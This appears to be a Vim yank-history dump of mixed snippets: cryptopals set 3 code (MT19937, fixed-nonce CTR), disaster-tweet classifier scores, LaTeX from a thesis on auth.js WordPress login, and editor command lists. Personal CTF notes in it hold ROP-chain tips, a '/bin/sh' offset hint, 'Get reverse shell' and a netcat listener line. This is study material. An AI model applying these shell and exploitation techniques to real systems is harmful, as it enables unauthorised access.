6be560b693f8c6fe4328434c57c2078a|file:///home/neo/cryptopals/set3/set3_sol.py|192|13|V|python
	            print(word)
2988b0334f8b707f86a4e068ca07365f|file:///home/neo/cryptopals/set3/set3_sol.py|194|17|v|python
	spellchecked_pt
d7a4faf1a04b51b255eec0fd6b355fae|file:///home/neo/cryptopals/set3/set3_sol.py|206|1|V|python
	    ciphertexts = encrypt_same_nonce_ctr(plaintexts19)
	    plaintexts = decrypt_same_nonce_ctr(ciphertexts)
	    for plaintext in plaintexts:
	        print(plaintext)
b36e700c003d0e8f661c4af09007d7d1|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|151|1|V|python
	kfold = model_selection.KFold(n_splits=10)
0abf629ddd7510ca4e70701be382da82|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|151|1|V|python
	kfold = model_selection.KFold(n_splits=10)
	cv_scores = model_selection.cross_val_score(model, X_train, y_train, cv=kfold, scoring="f1")
8c643411c47e09ff2c21c6f913cbe16b|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|12|1|V|tex
	\newcommand\elathan[1]{\textcolor{red}{#1}}
e38555107155fbf3bc9b0e9f6a2bafc1|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|79|239|v|tex
	(in this case "plain" authentication)
3ee8c48ec2f1aa85297e708815bc93d6|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|89|153|v|tex
	in both the log in and reset password forms.
88f74d37d563321c8bef5c139f2de2c8|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|89|116|v|tex
	{\tt scrypt\_seed\_ed25519\_keypair}
a23d54883ead35453ff82657cf707c59|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|5|V|tex
	    \item Whenever {\tt initializeCredentialType} is called, use the value {\tt scrypt\_seed\_ed25519\_keypair} 
551e3a849c0cbf4e1822a7e379b608f8|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|89|5|V|tex
	    \item Change the value of the {\tt passwordProccessMethod} field in the {\tt initializeCredentialType} call to {\tt scrypt\_seed\_ed25519\_keypair} in both the log in and reset password forms.
50ca4c9c12f9ce01ee383d1cb571402e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|99|850|v|tex
	 instead of the default {\tt wp\_authenticate\_email\_password}
9b618767d10caab20c11fbaaa595a7e7|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|101|1|V|tex
	\begin{lstlisting}[caption={Using the {\tt login\_enqueue\_scripts} hook to enqueue auth.js.}, label={lst:enqueue}]
		add_action( 'login_enqueue_scripts', 'enqueue_authjs' );
	
		function enqueue_authjs( $page ) {
			    wp_enqueue_script( 'auth', home_url() . '/wp-includes/js/auth.js', null, null, true );
		}
		do_action( 'login_enqueue_scripts' );
	\end{lstlisting}
	
ccc3b539827b25d18980f000b17e15c9|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|109|1|V|tex
	
	\begin{lstlisting}[caption={JavaScript code that uses {\tt auth.js} API to generate the credential and submit the reset password form}, label={lst:reset_pass}]
	jQuery("#resetpassform").on("submit", function (e) {
	    e.preventDefault(); //Stop form submission
	    let self = jQuery(this);
	    initializeCredentialType({
	     passwordMinLength: 8,
	     passwordProccessMethod: "plain",
	    });
	    let password = jQuery("#pass1").val();
	    let public_key = register(password); //Generate the credential using auth.js
	    public_key.then( (pk) => {
	        console.log(pk);
	        jQuery("#pass1").val(pk); //Set the new credential value to be submitted
	        jQuery("#pass2").val(pk);
	        jQuery("#resetpassform").off("submit");
	        self.submit();//Submit the form
	    })
	});
	\end{lstlisting}
a8d676d9134acba8724c94911720974c|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|88|603|v|tex
	Similarly to the reset password form, a script can be added to change the submitted password value on the login form
5b4245fae9071e34eb1dd760d392c910|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|88|591|v|tex
	. In the case of the {\tt plain} authentication scheme, the typed password length is checked and the password is submitted as is
e4c5477e274001fb8fec977c5ced716e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|88|720|v|tex
	 . Again, no actual change will be made to the typed password for the default authentication scheme.
a2bc5bf1bd72b2a168e2fc4843388e15|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|102|220|v|tex
	"scrypt\_seed\_ed25519\_keypair"
e02691a4737159ec6c07c4f547431762|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|128|1|V|tex
	\begin{lstlisting}[caption={Add a nonce as a cookie, as well as in the log in form as a hidden field}, label={lst:nonce}]
	# Create nonce and set it as a cookie 
	$token = bin2hex(openssl_random_pseudo_bytes(16));
	setcookie("nonce-message", $token, time() + 60 * 60 * 24);
	...
	# Add the nonce as a hidden field in the login form
	<input type="hidden" id="nonce-message" name="nonce-message" value="<?= $token ?>" />
	\end{lstlisting}
	
0ed61e19f46dd766e4ab76531aa507ee|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|165|1|V|tex
	\end{lstlisting}
72650e8e671eb76438319ca9403443d6|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|138|1|V|tex
	\begin{lstlisting}[language=PHP, caption={The {\tt authjs\_authenticate} function which is used in place of the default authentication function of WordPress}, label={lst:authjs_authenticate}]
a547930ad85726576ad86e57c6edddd6|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|153|1|V|tex
	\begin{lstlisting}[language=PHP, caption={The {\tt authjs\_authenticate} function which is used in place of the default authentication function of WordPress}, label={lst:authjs_authenticate}]
	function wp_authenticate_username_password( $user, $username, $password ) {
	
		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_password',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: The password you entered for the username %s is incorrect.' ),
					'<strong>' . $username . '</strong>'
	                ...
	    }            
	...
	}
	\end{lstlisting}
c12d944eba1ce5f9aab8f04ceebc56a2|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|138|43|v|tex
	The {\tt authjs\_authenticate} function which is used in place of the default authentication function of WordPress
6a718caf3f44f5cf197df9306d3e2437|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|138|118|v|tex
	authjs_authenticate
3cf5fa25f491290be0b2be0365b286f4|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|138|1|V|tex
	The {\tt check\_public\_key} function is added in the {\tt pluggable.php} file. Listing~\ref{lst:check_public_key} shows how {\tt check\_public\_key} verifies that the submitted signature is correct. In particular, it firstly splits the received credentials to get the public key and signature values and checks if the hash of the public key submitted by the user matches the stored public key hash. Then, it uses the submitted signature along with the Ed25519 public key and the original nonce value to verify the signature. We implemented this check as an external Python script, which uses the PyNaCl library to verify that the given signature is correct. Depending on the script's output, the authentication is either successful and the user is logged in, or the user is given a response that the authentication has failed.
	
b6c0aa1faeb010af3dd3b94cc720a92a|file:///home/neo/Documents/diplomatiki/auth.js/evaluation.tex|11|1|V|tex
	\neochr{Fix table formatting}
fdf8c044fb549077f1e9200e84882ae6|file:///home/neo/Documents/epl448/disaster-tweets/final_flag_scores.csv|130|1|^v|
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	d
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	T
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
	F
dfe442c821257c0d451fe4ea12fc7d68|file:///home/neo/Documents/epl448/disaster-tweets/final_flag_scores.csv|130|1|V|
	alse,False,False,False,False,False,False,
1c90ba5cf3791b6148c7887a696911ec|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	Flags:
eab1ea9c7e87ac782b6d02ccfc4e2877|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	dense: False
	tfidf: True
	clear_data: False
	stem: True
	lemmatize: True
	add_location: False
	add_keywords: False
1cf974341153d589fe7126d1c6ffd9ca|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|19|1|V|text
	True True True False True False False 0.6976357696437745
574c273d1430d385c7533e6d1bd5136d|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|1|1|V|text
	Average flags:
	dense: False
	tfidf: True
	clear_data: False
	stem: True
	lemmatize: True
	add_location: False
	add_keywords: False
	15 auto entropy 0.678295709151381
	
aa5050a650e5403d9ef959de0a3e1b58|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|1|1|V|text
	Best line flags:
9363c18677f7011937137f723c56dfe1|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|V|text
	15 auto entropy 0.6909803137730481
665ce94b9177a244004454802df28e39|file:///home/neo/Documents/epl448/disaster-tweets/decision_tree_flags_combinations.py|46|1|V|python
	### Choose min threshold for words to keep
	min_frequency_threshold = 20
7328cc6f57ab46ab43419febfea86257|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	dense: True
	tfidf: True
	clear_data: True
	stem: False
	lemmatize: True
	add_location: False
	add_keywords: False
cd22e18927a0a1e93f0c6b5277c9eae1|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|20|1|v|text
	True True True False False False False 
ebde2dc38a17727d94fa8b9631672779|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|v|text
	True False True False True False False 
c0b3ff9bf91ee385481e642e7b4650e7|file:///home/neo/vimwiki/Pwn.wiki|55|5|V|vimwiki
	- If we don't have a way to pass a pointer to the function we want to call, we can pass a pointer to another function which doesn't change the registers that hold the arguments (e.g. \_init, \_init\_array\_start).
	    + The call instruction will call the function we passed, without messing with the args
	    + Next, we need to bypass the jne instruction, so rbp and rbx need to have the same value (rbp = 1, rbx = 0+1 = 1)
	    + The execution flow will continue into the first gadget, so re-write some values to be popped (we probably don't care about the values in those registers, so just put junk)
	    + Write the address we want to return at directly (will return after the pops)
	
	- String "%s%s%s%s%s%s%s%s" is 64 bytes after "/bin/sh", substract if we get error (e.g. htb ropme chall)
a00e614a5a3fcc855d575b0ca5aec033|file:///home/neo/vimwiki/Pwn.wiki|37|5|V|vimwiki
	    -
c27689c2d4a3b27d643290efc8c0b2b4|file:///home/neo/vimwiki/Pwn.wiki|37|5|V|vimwiki
	    - 
f03f0c592260667695e7b41d5d7d7c49|file:///home/neo/vimwiki/Pwn.wiki|43|5|V|vimwiki
	    ```py
137aa588d49524427f5caf85f0582fe6|file:///home/neo/vimwiki/Pwn.wiki|55|5|V|vimwiki
	    ```
86266ee937d97f812a8e57d22b62ee29|file:///home/neo/vimwiki/Boxes.wiki|19|11|v|vimwiki
	reset
86266ee937d97f812a8e57d22b62ee29|file:///home/neo/vimwiki/Boxes.wiki|19|11|v|vimwiki
	reset
788b5dbe28b849781aa3bae4f66963e9|file:///home/neo/vimwiki/Boxes.wiki|20|11|v|vimwiki
	xterm
788b5dbe28b849781aa3bae4f66963e9|file:///home/neo/vimwiki/Boxes.wiki|20|11|v|vimwiki
	xterm
41d892ca2422baeed2841cb17fc793a4|file:///home/neo/vimwiki/Boxes.wiki|14|30|v|vimwiki
	nc -lvp port)
41d892ca2422baeed2841cb17fc793a4|file:///home/neo/vimwiki/Boxes.wiki|14|30|v|vimwiki
	nc -lvp port)
a33cada9161e95044c5c89f19107afde|file:///home/neo/vimwiki/Boxes.wiki|6|1|V|vimwiki
	- Get reverse shell: 
6f898d84075f8d9bde88f69b811d7f3a|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|V|text
	0.747898299780328
aab3cf1321c1afedd70cb5c73dddc02c|file:///home/neo/Documents/epl448/disaster-tweets/autorun_flags_combinations.py|43|21|v|python
	final_flags_combinations
9256e4c379ff4a504a88c567d54dcb97|file:///home/neo/Documents/epl448/disaster-tweets/autorun_flags_combinations.py|43|33|v|python
	combinations
01e6c99b6cb472bb55f3e98bf3ddec1d|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|1|1|V|text
	Find best flags first:
4e5868d676cb634aa75b125a0f741abf|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|12|11|v|text
	flags
9e2a28f58ab514e7a79d2973d4175f49|file:///home/neo/vimwiki/Boxes.wiki|10|133|v|vimwiki
	[ https://blog.ropnop.com/transferring-files-from-kali-to-windows/ ]
23fd7111d6ab8f7e956069a9f13566d3|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|12|7|v|text
	 0.742130451132858
2060a02c5428f5cdb704beca0e2e6abc|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	dense: True
	tfidf: True
	clear_data: True
	stem: False
	lemmatize: True
	add_location: False
	add_keywords: True
1a6def6c9d6e61f08af350d1c2302695|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|v|text
	True True True True True False True 
3beabed26c87e529a6d9976e05727ce2|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|v|text
	True False True True True False False 
7090a70169356af66112562a2d5a5029|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	0.7513752013993231
18035a28895811adc049acf9aaa30af5|file:///home/neo/vimwiki/Boxes.wiki|33|9|V|vimwiki
	        - 
0621541679415f7675922d6fa7104714|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|v|text
	True True True False True False True 
44c8575cd10d543dc1da875941b7dee3|file:///home/neo/Documents/epl682/report/report.tex|57|69|v|tex
	generated
ec67d3e649729fa94fb32942dca5894d|list:/commands|9|1|V|list
	prettier.formatFile
	python.setLinter	Select Linter
	python.setInterpreter	Select Interpreter
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	tags.generate
	prettier.open-output
	yank.clean
3e8828c7efdbba4972fc7014abea8bd9|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|V|text
	0.6778544379765601
a489ffed938ef1b9e86889bc413501ee|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors_flags_combinations.py|74|14|v|python
	uniform
bacf042467f7f0ba7aad0e09219a8289|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	Find best flags first: 
7867b06cb14436de7d8de06c56dede05|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|V|text
	False False True True True True False 0.7481235308256642
22631407becc0a0591e850565ad38e8f|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|v|text
	False False True True True True False 
f5ea9501480a9085d0f5f850c328b3c2|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|V|text
	0.7481235308256642
acd3fcad640a22120483f3fa346ca14f|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|13|20|v|text
	 0.6570173927363314
cc8324ce43f57f09358915d2d22b8fb4|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|v|text
	True True True False False False True 
f47173f7bc5c63d9476fa8bad018221d|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|9|1|V|text
	0.7439695193338783
aab0a540c9cd96ea393fea06cbaacaa6|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|10|1|V|text
	0.750952398434209
b20c9e3da3483390820450dd3c7efaf9|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|V|text
	0.741069333710684
18cd16f3b2d428f1905911bad4b87207|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|v|text
	True False True False True False True 
726504e545d02ff3da724b5b356ed1ec|file:///home/neo/Documents/epl448/disaster-tweets/logistic_regression_flags_combinations.py|68|13|v|python
	liblinear
1a6dfc6a927a242ea5739307d848e9e6|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|16|1|V|text
	0.7476988205935955
9eb37c471d18923ba449d08515547f78|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	dense: False
	tfidf: False
	clear_data: True
	stem: True
	lemmatize: True
	add_location: True
	add_keywords: False
4eb135d27004e7092b15b0cbb84d8e6b|list:/extensions|14|1|V|list
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	* coc-snippets	2.1.24	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-prettier	1.1.12	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-tsserver	1.4.12	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-json	1.2.5	~/.config/coc/extensions/node_modules/coc-json
	+ coc-java	1.4.9	~/.config/coc/extensions/node_modules/coc-java
	+ coc-go	0.7.0	~/.config/coc/extensions/node_modules/coc-go
ed521bfc39d122aa37272610fcb92d93|list:/extensions|4|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.12	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.24	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-go	0.7.0	~/.config/coc/extensions/node_modules/coc-go
	+ coc-java	1.4.9	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.5	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-tsserver	1.4.12	~/.config/coc/extensions/node_modules/coc-tsserver
b65fc12ad3f31e9ddc052413efb74938|list:/extensions|2|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
9a932b3cb396238423eb2f33ec17d6aa|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier_flags_combinations.py|68|13|v|python
	linear
5f7d8408c04ac298a29f4a859c462d6e|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	dense: True
	tfidf: False
	clear_data: True
	stem: False
	lemmatize: True
	add_location: False
	add_keywords: False
54a6e4ea7db62a132d2806c612336924|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|v|text
	False False True False True False False 
58c592a9b701c4e6143cb6ed69c4b507|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|V|text
	0.7563550320334045
719e66902691934f37ac2c58d35ffdfc|file:///home/neo/cryptopals/set3/set3_sol.py|216|5|V|python
	    print(mt)
9b22c2604ec99adacc1582b4a42d6146|file:///home/neo/cryptopals/set3/set3_sol.py|218|1|V|python
	    print(LOWER_MASK)
6fb71bc7202f4f760f65c12163ef644a|file:///home/neo/cryptopals/set3/set3_sol.py|220|5|V|python
	    print(int('1'*w, 2))
efcc207220f0688143f3234e2dcd6b33|file:///home/neo/cryptopals/set3/set3_sol.py|219|5|V|python
	    print(~LOWER_MASK)
bca59dec3f3ad369997ec2ee15218fb9|file:///home/neo/cryptopals/set3/set3_sol.py|219|5|V|python
	    print(UPPER_MASK)
6bc985c1917aeaa258a03b33c87da9d7|file:///home/neo/cryptopals/set3/set3_sol.py|202|1|V|python
	    w = 32
	    n = 624
	    m = 397
	    r = 31
	    a = 0x9908B0D
	    u = 11
	    d = 0xFFFFFFFF
	    s = 7
	    b = 0x9D2C5680
	    t = 15
	    c = 0xEFC60000
	    l = 18
	
	    mt = [0] * n
	    index = n + 1
	    LOWER_MASK = (1 << r) - 1
	    UPPER_MASK = ~LOWER_MASK & (int('1'*w, 2))
2d55b0bb47790a4fb97e533f7f3bc81c|file:///home/neo/cryptopals/set3/set3_sol.py|201|1|V|python
	def mt19937() -> bytes:
42548523551d152d10b636363c4e1509|file:///home/neo/cryptopals/set3/mt19937.py|21|1|V|python
	        print(self.UPPER_MASK)
a7c24ca037f444c1682702612c8006a8|file:///home/neo/cryptopals/set3/mt19937.py|23|5|V|python
	    def seed_mt(self,):
75eb49371808863bcc71630285585913|file:///home/neo/cryptopals/set3/mt19937.py|4|8|V|python
	        self.seed = seed
d591014f792fc9abf8f3bf3d5ccee522|file:///home/neo/cryptopals/set3/mt19937.py|20|46|v|python
	(int('1'* self.w, 2))
deb19344847ee624d58314b1e7b7f2a9|file:///home/neo/cryptopals/set3/mt19937.py|35|32|V|python
	        if self.__index >= self.
	        if self.__index > self.__n:
	            raise Exception('Generator was never seeded')
	        
cf8a65c6c58207b41fee072a40e39d6d|file:///home/neo/cryptopals/set3/mt19937.py|21|48|v|python
	& (int('1'* self.__w, 2))
0c84346e5ef74ece41a6a2805299a42e|file:///home/neo/cryptopals/set3/set3_sol.py|204|19|v|python
	.extract_number()
98c02212cf4c424367fa17b9f15a12c3|file:///home/neo/cryptopals/set3/set3_sol.py|205|1|V|python
	    print(x.extract_number)
6bba9a1a8968dca50174577f997effa5|file:///home/neo/cryptopals/set3/set3_sol.py|205|1|V|python
	    print(x.extract_number())
990f19b6245f11f341e310d66e37d770|file:///home/neo/cryptopals/set3/set3_sol.py|206|1|V|python
	    print(rand.extract_number())
ba404df7f86f015b1919c95c616a5a1c|file:///home/neo/cryptopals/set3/mt19937.py|23|9|V|python
	        print('1' * self.__w)
fc79da60e592cc1c81f69fc718ce761d|file:///home/neo/cryptopals/set3/mt19937.py|23|9|V|python
	        print(int('1' * self.__w, 2))
e8224f1e569a282517c0a09134f4c1a1|file:///home/neo/cryptopals/set3/mt19937.py|4|9|V|python
	        self.__w = 32
813bf09e6dac5127fc91854dfac17c37|file:///home/neo/cryptopals/set3/mt19937.py|25|1|V|python
	
	    def uint32(self, num):
	        return int(0xFFFFFFFF & num)
6a95187d51bd3fc9d4ca21a1b8d668c0|file:///home/neo/cryptopals/set3/mt19937.py|4|1|V|python
	        # self.__w = 64
	        # self.__n = 312
	        # self.__m = 156
	        # self.__r = 31
	        # self.__a = 0xB5026F5AA96619E9
	        # self.__u = 29
	        # self.__d = 5555555555555555
	        # self.__s = 17
	        # self.__b = 0x71D67FFFEDA60000
	        # self.__t = 37
	        # self.__c = 0xFFF7EEE000000000
	        # self.__l = 43
	        # self.__f = 6364136223846793005
03ca7a385979d8e5e0334cd8580ba85b|file:///home/neo/cryptopals/set3/mt19937.py|21|22|v|python
	B5026F5AA96619E9
52401a21844aefd5831f457eaf4ec4bb|file:///home/neo/cryptopals/set3/mt19937.py|23|20|v|python
	5555555555555555 
cb85ba7da0d909f0c7609eca978114c3|file:///home/neo/cryptopals/set3/mt19937.py|25|30|v|python
	71D67FFFEDA60000
d8c8e123e8f217a284981fdf1f0a9308|file:///home/neo/cryptopals/set3/mt19937.py|29|20|v|python
	6364136223846793005
0c6ffdff27cc1cca2b37686dcb474782|file:///home/neo/cryptopals/set3/set3_sol.py|207|5|V|python
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
7f389dc3a9e9063f37eeb2972b22c256|file:///home/neo/cryptopals/set3/mt19937.py|38|9|V|python
	        self.__index = 0
603d212fbafda13355a122a7dc22da31|file:///home/neo/cryptopals/set3/mt19937.py|44|1|V|python
	            x = (self.__mt[i] & self.__UPPER_MASK) + (self.__mt[(i+1) % self.__n] & self.__LOWER_MASK)
	            xA = x >> 1
	            if x % 2 != 0:
	                xA = xA ^ self.__a
	            self.__mt[i] = self.uint32(self.__mt[(i + self.__m) % self.__n] ^ xA)
02b4afa7a88002fb4526fafb88836a8f|file:///home/neo/cryptopals/set3/mt19937.py|51|9|V|python
	        print(self.__index)
ff2aee7778536bfbe6b76323b1e6c0a8|file:///home/neo/cryptopals/set3/mt19937.py|34|1|V|python
	        print(hex(self.__LOWER_MASK))
49f501d70ead6067038a15e19637c47c|file:///home/neo/cryptopals/set3/mt19937.py|35|26|v|python
	LOWER_MASK
93b1d3a6057bc39f81b07c0f55b3ef1e|file:///home/neo/cryptopals/set3/mt19937.py|35|9|V|python
	        print(hex(self.__UPPER_MASK))
10d35486b776f0282ea8b5782ce4b3eb|file:///home/neo/cryptopals/set3/set3_sol.py|209|1|V|python
	    print(npr.randint(0, 2**32))
c9b7f0dfce4f37d891f15dce8f0fd53c|file:///home/neo/cryptopals/set3/mt19937.py|25|9|V|python
	        # self.__index = 0
0ab78815c008e6dc36058922b68185a9|file:///home/neo/cryptopals/set3/mt19937.py|31|1|V|python
	        for i in range(self.__n):
	            x = (self.__mt[i] & self.__UPPER_MASK) + (self.__mt[(i+1) % self.__n] & self.__LOWER_MASK)
	            xA = x >> 1
	            if x % 2 != 0:
	                xA = xA ^ self.__a
	            self.__mt[i] = self.__mt[(i + self.__m) % self.__n] ^ xA
